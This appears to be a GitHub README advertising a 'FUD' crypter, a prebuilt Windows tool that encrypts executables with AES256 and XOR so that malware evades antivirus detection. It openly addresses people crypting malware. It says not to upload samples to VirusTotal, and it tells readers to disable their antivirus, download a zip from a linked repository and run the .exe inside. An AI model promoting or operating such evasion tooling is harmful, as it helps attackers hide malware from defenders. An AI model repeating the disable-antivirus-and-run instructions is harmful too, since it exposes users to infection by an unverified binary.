Description
-----
- I WLL UPDATE THE STUB SO THAT IT STILL FUD <strong>FOREVER</strong> and to paid my effort <strong>❗ DO NOT UPLOAD TO VIRUS TOTAL ❗</strong>
Contribute to the dream of making the only github fud crypter that will still <strong>FUD</strong>.

I created this <strong>FUD</strong> crypter for myself but I decided to share it.
I simplified it so that it can be accessible to everyone, so it's very easy to use and already compiled.
It was actually made for windows but I will release the source code and modify it a little bit so that linux users can use it too (I tried on wine and it's not working).

- | The stub have already been updated <strong>6 times.</strong> |

Usage/Install
-----
- Before downloading you will need to disable your Anti-Virus, otherwise it sends your crypted file to the Anti-Virus company
- Click <a href="https://github.com/DimitriVolkov1/GHOST-FUD-CRYPTER/archive/refs/heads/main.zip">HERE</a> to download
- EXTRACT before using otherwise the script will not work correctly
- Run the .exe 
- Set the input (The path to the malware you want to make undetectable) and ouput the directory where you want to file to be generated
- Click "! CRYPT NOW !" button, the process may take few minute.
- Finally enjoy your FUD crypted malware!


How does it work
----

GHOST got a complex AES256 and XOR encryption. It crypt the bytes of your exe so that it's encrypted in memory and then decrypted in runtime.
